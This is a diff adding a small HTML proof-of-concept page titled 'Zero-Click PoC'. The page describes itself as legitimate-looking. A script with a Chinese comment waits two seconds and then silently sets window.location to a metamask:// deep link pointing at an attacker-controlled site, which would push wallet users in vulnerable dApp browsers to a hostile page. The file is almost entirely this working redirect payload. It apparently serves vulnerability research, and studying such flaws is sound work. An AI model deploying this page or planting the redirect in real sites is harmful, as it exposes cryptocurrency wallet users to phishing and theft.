@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head><title>Zero-Click PoC</title></head>
+<body>
+<h1>Legitimate-looking page</h1>
+<p>This page silently redirects to MetaMask in vulnerable dApp browsers.</p>
+
+<script>
+// 使用 window.location 自动触发重定向
+setTimeout(function() {
+  window.location.href = "metamask://dapp/https://attacker-controlled-site.com";
+}, 2000);
+</script>
+</body>
+</html>
